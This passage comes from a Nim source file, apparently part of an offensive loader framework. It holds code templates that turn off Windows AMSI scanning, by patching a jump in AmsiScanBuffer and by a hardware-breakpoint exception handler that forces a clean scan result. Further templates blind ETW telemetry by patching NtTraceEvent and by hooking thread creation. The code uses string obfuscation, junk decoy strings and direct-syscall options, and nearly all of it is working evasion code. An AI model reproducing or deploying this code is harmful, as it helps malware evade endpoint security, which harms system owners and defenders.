                        echo obf("[+] OldProtect set back")
                    disabled = true
            else:
                when defined(HellsGate):
                    if getSyscall(ntProtectTable):                
                        syscall = ntProtectTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                success = NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,0x04,addr t) 
                if (success != 0):
                    when defined(verbose):
                        echo obf("NtProtectVirtualMemory failed")
                    return
                when defined(verbose):
                    echo obf("[*] Applying Syscall AMSI patch")
                when defined(HellsGate):
                    if getSyscall(ntWriteTable):
                        syscall = ntWriteTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
                var outLength: SIZE_T
            
                success = NtWriteVirtualMemory(pHandle,cs,unsafeAddr patch,SIZE_T(patch.len),addr outLength)
            
                if (success != 0):
                    when defined(verbose):
                        echo obf("NtWriteVirtualMemory failed")
                    return
                
                when defined(HellsGate):
                    if getSyscall(ntProtectTable):
                        syscall = ntProtectTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                success =  NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                if (success != 0):
                    when defined(verbose):
                        echo obf("NtProtectVirtualMemory failed")
                    return
                else:
                    when defined(verbose):
                        echo obf("[*] OldProtect set back")
                    disabled = true
                
        when defined(verbose):
            echo obf("[*] AMSI disabled: ") & $disabled
        return
    ProviderPatchAmsi()
"""

let HardwareBreakPointStub * = """

proc setBits(value: uint32, start: int, length: int, newValue: uint32): uint32 =
    let mask = (1 shl length) - 1
    (value and not uint32((mask shl start))) or ((newValue and uint32(mask)) shl uint32(start))

proc clearBreakpoint(ctx: PCONTEXT, index: int) =
    # Clear the releveant hardware breakpoint
    case index
    of 0: ctx.Dr0 = 0
    of 1: ctx.Dr1 = 0
    of 2: ctx.Dr2 = 0
    of 3: ctx.Dr3 = 0
    else: discard

    # Clear DRx HBP to disable for local mode
    ctx.Dr7 = DWORD64(setBits(uint32(ctx.Dr7), (index * 2), 1, 0))
    ctx.Dr6 = 0
    ctx.EFlags = 0

proc enableBreakpoint(ctx: PCONTEXT, address: PVOID, index: int) =
    # Set the releveant hardware breakpoint
    case index
    of 0: ctx.Dr0 = cast[ULONG_PTR](address)
    of 1: ctx.Dr1 = cast[ULONG_PTR](address)
    of 2: ctx.Dr2 = cast[ULONG_PTR](address)
    of 3: ctx.Dr3 = cast[ULONG_PTR](address)
    else: discard

    
    # Set bits 16-31 as 0, which sets
    # DR0-DR3 HBP's for execute HBP
    ctx.Dr7 = DWORD64(setBits(uint32(ctx.Dr7), 16, 16, 0))
    
    # Set DRx HBP as enabled for local mode
    ctx.Dr7 = DWORD64(setBits(uint32(ctx.Dr7), (index * 2), 1, 1))
    ctx.Dr6 = 0



proc getArg(ctx: PCONTEXT, index: int): ULONG_PTR =
    when defined(amd64):
        case index
        of 0: return ctx.Rcx
        of 1: return ctx.Rdx
        of 2: return ctx.R8
        of 3: return ctx.R9
        else: return cast[ptr ULONG_PTR](ctx.Rsp + ((index + 1) * 8))[]
    # No x86 Support for the moment, as winim somehow throws errors not finding Esp although its there https://github.com/khchen/winim/blob/master/winim/inc/windef.nim#L570
    #when not defined(cpu64):
    #    return cast[ULONG_PTR](ctx.Esp + (index + 1 * 4))

proc getReturnAddress(ctx: PCONTEXT): ULONG_PTR =
    when defined(amd64):
        return cast[ptr ULONG_PTR](ctx.Rsp)[]
    #when defined(i386):
    #    return cast[ULONG_PTR](ctx.Esp)

proc setResult(ctx: PCONTEXT, result: ULONG_PTR) =
    #when defined(i386):
    #    ctx.Eax = result
    when defined(amd64):
        ctx.Rax = result

proc adjustStackPointer(ctx: PCONTEXT, amount: int) =
    #when defined(i386):
    #    ctx.Esp += amount
    when defined(amd64):
        ctx.Rsp += amount

proc setIP(ctx: PCONTEXT, newIP: ULONG_PTR) =
    #when defined(i386):
    #    ctx.Eip = newIP
    when defined(amd64):
        ctx.Rip = newIP

# we need a custom memset function here, as winim does not have that
proc memset(dest: pointer, value: int, size: int) =
    var p = cast[ptr uint8](dest)
    for i in 0 ..< size:
        p[i] = uint8(value)
"""

let AMSIExceptionHandlerStub * = """

var g_amsiScanBufferPtr: PVOID = nil
var AMSI_RESULT_CLEAN = 0
type pint = ptr int

proc AMSIExceptionHandler(exceptions: PEXCEPTION_POINTERS): LONG {.stdcall} =
    if exceptions.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP and exceptions.ExceptionRecord.ExceptionAddress == g_amsiScanBufferPtr:
        when defined(verbose):
            echo "[+] Exception for AmsiScanBuffer!"
        # Get the return address by reading the value currently stored at the stack pointer
        let returnAddress = getReturnAddress(exceptions.ContextRecord)
        var randone: string = obf("lasdjhqwoiehdjasdknal")
        when defined(verbose):
            if (returnAddress == 0):
                echo obf("[-] Return address is 0")
            else:
                echo obf("[+] Return Address: ") & toHex(returnAddress)
        # Get the address of the 5th argument, which is an int* and set it to a clean result
        var scanResult: pint = cast[ptr int](getArg(exceptions.ContextRecord, 5))
        when defined(verbose):
            echo obf("[*] Real Scan Result: ") & $scanResult[]
        # Now set the value of the scanResult to AMSI_RESULT_CLEAN
        scanResult[] = AMSI_RESULT_CLEAN
        when defined(verbose):
            echo obf("[*] New scan Result: ") & $scanResult[]
        var randtwo: string = obf("lasdjhqikoasujdoaisdwoiehdjasdknal")
        # update the current instruction pointer to the caller of AmsiScanBuffer
        
        setIP(exceptions.ContextRecord, returnAddress)
        when defined(verbose):
            echo obf("[*] Set Instruction pointer done")
        # We need to adjust the stack pointer accordinly too so that we simulate a ret instruction
        adjustStackPointer(exceptions.ContextRecord, sizeof(PVOID))
        when defined(verbose):
            echo obf("[*] Adjust Stack Pointer done")
        # Set the eax/rax register to 0 (S_OK) indicatring to the caller that AmsiScanBuffer finished successfully
        setResult(exceptions.ContextRecord, S_OK)
        when defined(verbose):
            echo obf("[+] S_OK set")
        var randthree: string = obf("lasopqwiedasdjasldkjl")
        # Clear the hardware breakpoint, since we are now done with it
        when defined(oneshot):
            clearBreakpoint(exceptions.ContextRecord, 0)
        when defined(verbose):
            echo obf("[*] Cleared breakpoint")
        return EXCEPTION_CONTINUE_EXECUTION
    else:
        return EXCEPTION_CONTINUE_SEARCH

"""

let AmsiStub * = """

    proc setupAMSIBypass(): HANDLE =
        var threadCtx: CONTEXT
        memset(threadCtx.addr, 0, sizeof(threadCtx))
        threadCtx.ContextFlags = CONTEXT_ALL

        # Load amsi.dll if it hasn't be loaded alreay.
        var split: string = obf("si.dll")
        if g_amsiScanBufferPtr == nil:
            when defined(DInvoke):
                var amsi = MyGetModuleHandleA(obf("am")&split)
            else:
                var amsi = GetModuleHandleA(obf("am")&split)
            
            var ModuleFileName: UNICODE_STRING
            when defined(DInvoke):
                MyRtlInitUnicodeString(addr(ModuleFileName), obf("am")&split)
            else:
                RtlInitUnicodeString(addr(ModuleFileName), obf("am")&split)
            
            when defined(DInvoke):
                var dllstatus = MyLdrLoadDll(nil, 0, &ModuleFileName, &amsi)
            else:
                var dllstatus = LdrLoadDll(nil, 0, &ModuleFileName, &amsi)

            if not NT_SUCCESS(dllstatus):
                when defined(verbose):
                    echo obf("[X] Failed to load: amsi.dll")
                    return
            else:
                when defined(verbose):
                    echo obf("[+] Loaded: amsi.dll")
            var splitString: string = obf("ScanBuffer")
            if amsi != 0:
                when defined(DInvoke):
                    g_amsiScanBufferPtr = cast[PVOID](MyGetProcAddress(amsi, obf("Amsi")&splitString))
                else:
                    g_amsiScanBufferPtr = cast[PVOID](GetProcAddress(amsi, obf("Amsi")&splitString))

            if g_amsiScanBufferPtr == nil:
                when defined(verbose):
                    echo obf("[-] Failed to Load AmsiScanBuffer")
                return 0
                #quit(1)
            else:
                when defined(verbose):
                    echo obf("[+] AmsiScanBuffer found")
        # add our vectored exception handle
        when defined(DInvoke):
            let hExHandler = MyRtlAddVectoredExceptionHandler(1, AMSIExceptionHandler)
        else:
            let hExHandler = RtlAddVectoredExceptionHandler(1, AMSIExceptionHandler)
        
        if (hExHandler != nil):
            when defined(verbose):
                echo obf("[+] Vectored Exception Handler installed")
        else:
            when defined(verbose):
                echo obf("[-] Failed to install Vectored Exception Handler")
            return 0

        # Set a hardware breakpoint on AmsiScanBuffer function
        when defined(DInvoke):
            if MyGetThreadContext(cast[HANDLE](-2), threadCtx.addr):
                enableBreakpoint(threadCtx, g_amsiScanBufferPtr, 0)
                discard MySetThreadContext(cast[HANDLE](-2), threadCtx.addr)
        else:
            if GetThreadContext(cast[HANDLE](-2), threadCtx.addr):
                enableBreakpoint(threadCtx, g_amsiScanBufferPtr, 0)
                SetThreadContext(cast[HANDLE](-2), threadCtx.addr)

        return cast[HANDLE](hExHandler)

    discard setupAMSIBypass()


"""


let AMSIPatchStub * = """
    proc PatchAmsi(): bool =
        var
            amsi: HMODULE
            cs: pointer
            op: ULONG
            t: ULONG
            disabled: bool = false
        
        when defined amd64:
            let patch: array[1, byte] = [byte 0x75] # Patch to JNZ, old value was 0x74 (JNZ)
        elif defined i386:
            let patch: array[1, byte] = [byte 0x75]
        
        var ModuleFileName: UNICODE_STRING
        when defined(DInvoke):
            MyRtlInitUnicodeString(addr(ModuleFileName), obf("amsi.dll"))
        else:
            RtlInitUnicodeString(addr(ModuleFileName), obf("amsi.dll"))
        when defined(DInvoke):
            var dllstatus = MyLdrLoadDll(nil, 0, &ModuleFileName, &amsi)
        else:
            var dllstatus = LdrLoadDll(nil, 0, &ModuleFileName, &amsi)
        if not NT_SUCCESS(dllstatus):
            when defined(verbose):
                echo obf("[X] Failed to load: amsi.dll")
                return
        else:
            when defined(verbose):
                echo obf("[+] Loaded: amsi.dll")

        when defined(DInvoke):
            cs = MyGetProcAddress(amsi,obf("AmsiScanBuffer"))
        else:
            cs = GetProcAddress(amsi,obf("AmsiScanBuffer"))
        if isNil(cs):
            when defined(verbose):
                echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
            return disabled
        when defined amd64:
            cs = cs + 0x6D # Since Win11, there is no more JNZ, but JZ So we're going to patch the JZ to JNZ
            #cs = cs + 0x83 # Old value for Win10 to change JNZ to JZ. Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
        else:
            #cs = cs + 0x75 # old value
            cs = cs + 0x47 # Since Win11, there is no more JNZ, but JZ So we're going to patch the JZ to JNZ
        var oldProtection: DWORD = 0
        var success: BOOL
        var protectAddress = cs
        var friendlycodeLength = cast[SIZE_T](patch.len)

        var pHandle: HANDLE = -1
        var 
            status          : NTSTATUS          = 0x00000000
            buffer          : LPVOID
        
        when defined(SysWhispers):
            status = uashdiasdj(pHandle, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                    
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to change memory protections.")
            else:
                when defined(verbose):
                    echo obf("[*] Applying Syscall (SysWhispers) AMSI patch")

            var 
                bytesWritten: SIZE_T

            var outLength: SIZE_T
            status = oqiazasusjk(pHandle,cs,unsafeAddr patch,SIZE_T(patch.len),addr outLength)

            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to write memory.")
            else:
                when defined(verbose):
                    echo obf("[+] oqiazasusjk Succeed!")
                    
                
            status = uashdiasdj(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                    
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[+] OldProtect set back")
                disabled = true
        else:
            when defined(HellsGate):
                if getSyscall(ntProtectTable):                
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
            success = NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,0x04,addr t) 
            if (success != 0):
                when defined(verbose):
                    echo obf("NtProtectVirtualMemory failed")
                return disabled
            when defined(verbose):
                echo obf("[*] Applying Syscall AMSI patch")

            when defined(HellsGate):
                if getSyscall(ntWriteTable):
                    syscall = ntWriteTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
            var outLength: SIZE_T
        
            success = NtWriteVirtualMemory(pHandle,cs,unsafeAddr patch,SIZE_T(patch.len),addr outLength)
        
            if (success != 0):
                when defined(verbose):
                    echo obf("NtWriteVirtualMemory failed")
                return disabled
            
            when defined(HellsGate):
                if getSyscall(ntProtectTable):
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
            success =  NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
            if (success != 0):
                when defined(verbose):
                    echo obf("NtProtectVirtualMemory failed")
                return disabled
            else:
                when defined(verbose):
                    echo obf("[*] OldProtect set back")
                disabled = true

        return disabled

    success = PatchAmsi()
    when defined(verbose):
        echo obf("[*] AMSI disabled: ") & fmt"{bool(success)}"

"""

let ETWExceptionHandlerStub * = """

var g_ntTraceEventBufferPtr: PVOID = nil

proc ETWExceptionHandler(exceptions: PEXCEPTION_POINTERS): LONG {.stdcall.} =
    if exceptions.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP and exceptions.ExceptionRecord.ExceptionAddress == g_ntTraceEventBufferPtr:
        when defined(verbose):
            echo obf("[+] Exception for NtTraceEvent!")
        var randten: string = obf("luazshajsuahsajsul")
        # Get the return address by reading the value currently stored at the stack pointer
        let returnAddress = getReturnAddress(exceptions.ContextRecord)
        
        when defined(verbose):
            if (returnAddress == 0):
                echo obf("[-] Return address is 0")
            else:
                echo obf("[+] Return Address: ") & toHex(returnAddress)
        
        # Update the current instruction pointer to the return address to skip this call
        setIP(exceptions.ContextRecord, returnAddress)
        when defined(verbose):
            echo obf("[*] Set Instruction pointer done")
        var randeleven: string = obf("uazahahjsgatszasau")
        # We need to adjust the stack pointer accordinly too so that we simulate a ret instruction
        adjustStackPointer(exceptions.ContextRecord, sizeof(PVOID))
        when defined(verbose):
            echo obf("[*] Adjust Stack Pointer done")

        # Clear the hardware breakpoint, since we are now done with it
        #when defined(oneshot):
        #    clearBreakpoint(exceptions.ContextRecord, 0)
        #when defined(verbose):
        #    echo obf("[*] Cleared breakpoint")
        return EXCEPTION_CONTINUE_EXECUTION
    else:
        return EXCEPTION_CONTINUE_SEARCH

when defined(HardwareETW):
    type
        OldBaseThreadInitThunk = proc(LdrReserved: DWORD, lpStartAddress: LPTHREAD_START_ROUTINE, lpParameter: LPVOID): void {.stdcall.}

    var Kernel32ThreadInitThunkFunction: ULONG_PTR
    when defined(DInvoke):
        var fn = cast[ULONG_PTR](MyGetProcAddress(MyGetModuleHandleA(obf("kernel32")), obf("BaseThreadInitThunk")))
    else:
        var fn = cast[ULONG_PTR](GetProcAddress(GetModuleHandleA(obf("kernel32")), obf("BaseThreadInitThunk")))

    # This is our hook function, which will set the Breakpoint for a new Thread and afterwards call the original function
    proc BaseThreadInitThunk(LdrReserved: DWORD, lpStartAddress: LPTHREAD_START_ROUTINE, lpParameter: LPVOID): void =
      when defined(verbose):
        echo obf("[*] New Thread created and catched via Hook...")
        when defined(DInvoke):
            echo obf("[*] Thread ID: "), MyGetCurrentThreadId()
        else:
            echo obf("[*] Thread ID: "), GetCurrentThreadId()
      var randblup13: string = obf("kasiquzashbyxncym")
      # Actually set the Breakpoint for the current Thread
      var threadCtx: CONTEXT
      threadCtx.ContextFlags = CONTEXT_ALL

      when defined(DInvoke):
        if MyGetThreadContext(cast[HANDLE](-2), threadCtx.addr):
          var randtwelve: string = obf("uzaszduasdbhnjyxcbnmykj")
          enableBreakpoint(threadCtx, g_ntTraceEventBufferPtr, 1)
          discard MySetThreadContext(cast[HANDLE](-2), threadCtx.addr)
          when defined(verbose):
            when defined(DInvoke):
                echo obf("Breakpoint set for Thread ID: "), MyGetCurrentThreadId()
            else:
              echo obf("Breakpoint set for Thread ID: "), GetCurrentThreadId()
      else:
        if GetThreadContext(cast[HANDLE](-2), threadCtx.addr):
            var randtwelve: string = obf("uzaszduasdbhnjyxcbnmykj")
            enableBreakpoint(threadCtx, g_ntTraceEventBufferPtr, 1)
            SetThreadContext(cast[HANDLE](-2), threadCtx.addr)
            when defined(verbose):
                when defined(DInvoke):
                    echo obf("Breakpoint set for Thread ID: "), MyGetCurrentThreadId()
                else:
                    echo obf("Breakpoint set for Thread ID: "), GetCurrentThreadId()
        # Restore the old function
      discard InterlockedCompareExchangePointer(cast[ptr PVOID](Kernel32ThreadInitThunkFunction), cast[PVOID](fn), cast[PVOID](BaseThreadInitThunk))
      # Cast it to the old function type and call it afterwards with the original parameters
      var oldBaseThreadInitThunk: OldBaseThreadInitThunk = cast[OldBaseThreadInitThunk](fn)
      oldBaseThreadInitThunk(LdrReserved, lpStartAddress, lpParameter)

"""

let ETWStub * = """

    proc hookBaseThreadInitThunk(): void =
      when defined(DInvoke):
        var m = MyGetModuleHandleA(obf("ntdll"))
      else:
        var m = GetModuleHandleA(obf("ntdll"))
      var nt = cast[PIMAGE_NT_HEADERS](m + cast[PIMAGE_DOS_HEADER](m).e_lfanew)
      var randblup: string = obf("iuazduiasdhjaskd")
      var sh = IMAGE_FIRST_SECTION(nt)

      var ds: ptr ULONG_PTR = nil #cast[ptr ULONG_PTR](m + sh.VirtualAddress)[]
      var cnt: int #= nil #sh.Misc.VirtualSize div sizeof(ULONG_PTR)
      var low: uint16 = 0
      for sh in low ..< nt.FileHeader.NumberOfSections:
        var ntdllSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(nt)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * sh))
        if obf(".data") in toString(ntdllSectionHeader.Name):
          ds = cast[ptr ULONG_PTR](m + ntdllSectionHeader.VirtualAddress)
          cnt = ntdllSectionHeader.Misc.VirtualSize div sizeof(ULONG_PTR)
          break
      var randthirteen: string = obf("uaszahhasdgahsdzt")
      when defined(verbose):
        echo obf("[*] Searching for kernel32!BaseThreadInitThunk in ntdll.dll: "), toHex(fn)
      for i in 0 ..< cnt:
        var randblup2: string = obf("iouazdaisduia")
        if(ds[i] == fn):
          when defined(verbose):
            echo obf("[+] Found ntdll!Kernel32ThreadInitThunkFunction @ "), toHex(cast[ULONG_PTR](&ds[i]))
          Kernel32ThreadInitThunkFunction = cast[ULONG_PTR](&ds[i])
          break
      
      # Overwrite with our function
      when defined(verbose):
        echo obf("[+] Hooking ntdll!Kernel32ThreadInitThunkFunction with our function...")
      discard InterlockedCompareExchangePointer(cast[ptr PVOID](Kernel32ThreadInitThunkFunction), cast[PVOID](BaseThreadInitThunk), cast[PVOID](fn))

    # This function will set Breakpoints for each thread in the process and afterwards call a Hooking function for new Threads.
    proc SetupETWBreakpoints(): void =
        # Load ntdll.dll if it hasn't be loaded alreay.
        if g_ntTraceEventBufferPtr == nil:
            when defined(DInvoke):
                var ntdll = MyGetModuleHandleA(obf("ntdll.dll"))
            else:
                var ntdll = GetModuleHandleA(obf("ntdll.dll"))
            
            if(ntdll == 0):
                var randblup3: string = obf("iuiazdoasdia")
                var ModuleFileName: UNICODE_STRING
                when defined(DInvoke):
                    MyRtlInitUnicodeString(ModuleFileName, obf("ntdll.dll"))
                else:
                    RtlInitUnicodeString(ModuleFileName, obf("ntdll.dll"))
                when defined(DInvoke):
                    var dllstatus = MyLdrLoadDll(nil, 0, &ModuleFileName, &ntdll)
                else:
                    var dllstatus = LdrLoadDll(nil, 0, &ModuleFileName, &ntdll)

                if not NT_SUCCESS(dllstatus):
                    when defined(verbose):
                        echo obf("[X] Failed to load: ntdll.dll")
                        return
                else:
                    when defined(verbose):
                        echo obf("[+] Loaded: ntdll.dll")
            
            if ntdll != 0:
                when defined(DInvoke):
                    g_ntTraceEventBufferPtr = cast[PVOID](MyGetProcAddress(ntdll, obf("NtTraceEvent")))
                else:
                    g_ntTraceEventBufferPtr = cast[PVOID](GetProcAddress(ntdll, obf("NtTraceEvent")))
            if g_ntTraceEventBufferPtr == nil:
                when defined(verbose):
                    echo obf("[-] Failed to Load NtTraceEvent")
                #return 0
                #quit(1)
            var randblup4: string = obf("uaszdastdtasdghaj")
        # add our vectored exception handle
        when defined(DInvoke):
            let hExHandler = MyRtlAddVectoredExceptionHandler(1, ETWExceptionHandler)
        else:
            let hExHandler = RtlAddVectoredExceptionHandler(1, ETWExceptionHandler)
        when defined(verbose):
            when defined(DInvoke):
                echo obf("[*] Monitoring Threads for ") & $MyGetCurrentProcessId()
            else:
                echo obf("[*] Monitoring Threads for ") & $GetCurrentProcessId()
        
        # assuming, we will not have more than 50 Threads, we'll create 50 context structures for each thread.
        var threadCtx: array[50, CONTEXT]
        for i in 0 ..< 50:
            memset(threadCtx[i].addr, 0, sizeof(threadCtx[i]))
            threadCtx[i].ContextFlags = CONTEXT_ALL
        
        # first we are going to count the number of Threads for the current process.
        var threadCount: DWORD = 0
        var threads: array[1024, DWORD]
        var hThreadSnap: HANDLE = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
        if hThreadSnap == INVALID_HANDLE_VALUE:
            when defined(verbose):
                echo obf("[-] Failed to create thread snapshot")
            return
        var te32: THREADENTRY32
        te32.dwSize = DWORD(sizeof(THREADENTRY32))
        if Thread32First(hThreadSnap, addr te32) == 0:
            var randblup11: string = obf("oasidasudash")
            when defined(verbose):
                echo obf("[-] Failed to get first thread")
            return
        while Thread32Next(hThreadSnap, addr te32) != 0:
            when defined(DInvoke):
                if te32.th32OwnerProcessID == MyGetCurrentProcessId():
                    threads[threadCount] = te32.th32ThreadID
                    inc threadCount
            else:
                if te32.th32OwnerProcessID == GetCurrentProcessId():
                    threads[threadCount] = te32.th32ThreadID
                    inc threadCount
        when defined(DInvoke):
            discard MyCloseHandle(hThreadSnap)
        else:
            CloseHandle(hThreadSnap)
        # Now we have a list of all the threads in the current process, we can iterate through them and attach a hardware breakpoint to them.
        for i in 0 ..< threadCount:
            when defined(DInvoke):
                var hThread = MyOpenThread(THREAD_ALL_ACCESS, false, threads[i])
            else:
                var hThread = OpenThread(THREAD_ALL_ACCESS, false, threads[i])
            if hThread == 0:
                when defined(verbose):
                    echo obf("[-] Failed to open thread")
                return
            #var context: CONTEXT
            #context.ContextFlags = CONTEXT_ALL
            when defined(DInvoke):
                if MyGetThreadContext(hThread, threadCtx[i].addr) == 0:
                    when defined(verbose):
                        echo obf("[-] Failed to get thread context")
                    return
            else:
                if GetThreadContext(hThread, threadCtx[i].addr) == 0:
                    when defined(verbose):
                        echo obf("[-] Failed to get thread context")
                    return
            # Check if the thread already has a hardware breakpoint set
            if (threadCtx[i].Dr7 == 0) or (threadCtx[i].DR7 == DWORD64(0x0000000000000401)#[AMSI Hardware Breakpoint for Main Thread]#):
                # Set the hardware breakpoint
                var randblup5: string = obf("oihanyxbcyxm")
                enableBreakPoint(threadCtx[i], g_ntTraceEventBufferPtr, 1)
                when defined(DInvoke):
                    if MySetThreadContext(hThread, addr threadCtx[i]) == 0:
                        when defined(verbose):
                            echo obf("[-] Failed to set thread context")
                        return
                else:
                    if SetThreadContext(hThread, addr threadCtx[i]) == 0:
                        when defined(verbose):
                            echo obf("[-] Failed to set thread context")
                        return
                var randblup6: string = obf("iasduasdm")
                when defined(verbose):
                    echo obf("[+] Attached Hardware Breakpoint to Thread: ") & $threads[i]
            when defined(DInvoke):
                discard MyCloseHandle(hThread)
            else:
                CloseHandle(hThread)
        # After setting the Breakpoint for all current Threads, we will also set a hook on BaseThreadInitThunk to also set Breakpoints for new threads.
        hookBaseThreadInitThunk()
    
    # This is a Workaround for the fact, that I for the sake of xxx cannot catch the CLR Thread even with hooks. 
    # So I'm first loading CLR with harmless Code, so that the Thread exists and afterwards set Breakpoints for each Thread.
    proc Decoy() =
      ## Create a CLR object (aka. C# instance) and call the method
      clrStart()
      #var mscor = load(obf("mscorlib"))
      #var rand = mscor.new(obf("System.Random"))
      #var randomNumber = rand.Next()
      #when defined(verbose):
      #  echo randomNumber
    # This function leads to a process crash for Powershell as well as for DLLs loaded via rundll32.exe or else. Who knows why, but we'll therefore remove it which leads to us not being able to set a Hardware Breakpoint for the clr.dll Thread.
    when not defined(powershell):
        when not defined(lib_only):
            when not defined(Stego):
                Decoy()
    when defined(DInvoke):
        discard MySleep(1500)
    else:
        Sleep(1500)
    SetupETWBreakpoints()

"""

let ETWPatchStub * = """
    proc Patchntdll(): bool =
        var
            ntdll: HMODULE
            cs: pointer
            op: ULONG
            t: ULONG
            disabled: bool = false
            PatchAPIs: seq[string] = @[obf("NtTraceEvent")] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
        when defined amd64:
            let patch: array[1, byte] = [byte 0xc3]
        elif defined i386:
            let patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
        
        var ModuleFileName: UNICODE_STRING
        when defined(DInvoke):
            MyRtlInitUnicodeString(ModuleFileName, obf("ntdll.dll"))
        else:
            RtlInitUnicodeString(ModuleFileName, obf("ntdll.dll"))
        when defined(DInvoke):
            var dllstatus = MyLdrLoadDll(nil, 0, &ModuleFileName, &ntdll)
        else:
            var dllstatus = LdrLoadDll(nil, 0, &ModuleFileName, &ntdll)
        if not NT_SUCCESS(dllstatus):
            when defined(verbose):
                echo obf("[X] Failed to load: ntdll.dll")
                return disabled
        else:
            when defined(verbose):
                echo obf("[+] Loaded: ntdll.dll")
        #when defined(DInvoke):
        #    ntdll = MyLoadLibraryA(obf("ntdll"))
        #else:
        #    ntdll = LoadLibraryA(obf("ntdll"))
        #if (ntdll == 0):
        #    when defined(verbose):
        #        echo obf("[X] Failed to load ntdll.dll")
        #    return disabled

        for singleAPI in PatchAPIs:
            when defined(verbose):
                echo obf("[*] Patching : "),singleAPI

            when defined(DInvoke):
                cs = MyGetProcAddress(ntdll,singleAPI)
            else:
                cs = GetProcAddress(ntdll,singleAPI)
            if isNil(cs):
                when defined(verbose):
                    echo obf("[X] Failed to get the address of "), singleAPI
                break

        var oldProtection: DWORD = 0
        var success: BOOL
        var protectAddress = cs
        var friendlycodeLength = cast[SIZE_T](patch.len)

        var pHandle: HANDLE = -1
        var 
            status          : NTSTATUS          = 0x00000000
            buffer          : LPVOID
        
        when defined(SysWhispers):
            status = uashdiasdj(pHandle, addr protectAddress,addr friendlycodeLength,0x40,addr t)
                    
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to change memory protections.")
            else:
                when defined(verbose):
                    echo obf("[*] Applying Syscall (SysWhispers) ETW patch")

            var 
                bytesWritten: SIZE_T

            var outLength: SIZE_T
            status = oqiazasusjk(pHandle,cs,unsafeAddr patch,SIZE_T(patch.len),addr outLength)

            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to write memory.")
            else:
                when defined(verbose):
                    echo obf("[+] oqiazasusjk Succeed!")
                    
                
            status = uashdiasdj(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                    
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[+] OldProtect set back")
                disabled = true
        else:
            when defined(HellsGate):
                if getSyscall(ntProtectTable):                
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
            success = NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
            if (success != 0):
                when defined(verbose):
                    echo obf("NtProtectVirtualMemory failed")
                return disabled
            when defined(verbose):
                echo obf("[*] Applying Syscall ETW patch")

            when defined(HellsGate):
                if getSyscall(ntWriteTable):
                    syscall = ntWriteTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
            var outLength: SIZE_T
        
            success = NtWriteVirtualMemory(pHandle,cs,unsafeAddr patch,SIZE_T(patch.len),addr outLength)
        
            if (success != 0):
                when defined(verbose):
                    echo obf("NtWriteVirtualMemory failed")
                return disabled
            
            when defined(HellsGate):
                if getSyscall(ntProtectTable):
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
            success =  NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
            if (success != 0):
                when defined(verbose):
                    echo obf("NtProtectVirtualMemory failed")
                return disabled
            else:
                when defined(verbose):
                    echo obf("[*] OldProtect set back")
                disabled = true

        return disabled

    success = Patchntdll()
    when defined(verbose):
        echo obf("[*] ETW blocked by patch: ") & fmt"{bool(success)}"
"""



let SleepStubFirst * = fmt"""
# Credit to @WhyDee86 - https://twitter.com/WhyDee86 for this sleep implementation

import random
import times

type Node = ref object
  x, y: int32
  left, right: Node

template newNode(value: int32): Node =
  Node(x: value, y: rand(high int32).int32)

proc merge(lower, greater: Node, res: var Node) =
  if lower.isNil:
    res = greater
  elif greater.isNil:
    res = lower
  elif lower.y < greater.y:
    res = lower
    merge(lower.right, greater, lower.right)
  else:
    res = greater
    merge(lower, greater.left, greater.left)

template merge(lower, equal, greater: Node, res: var Node) =
  merge(lower, equal, res)
  merge(res, greater, res)

proc splitBinary(orig: Node, lower, equalGreater: var Node, value: int32) =
  if orig.isNil:
    lower = nil
    equalGreater = nil
  elif orig.x < value:
    lower = orig
    splitBinary(lower.right, lower.right, equalGreater, value)
  else:
    equalGreater = orig
    splitBinary(equalGreater.left, lower, equalGreater.left, value)

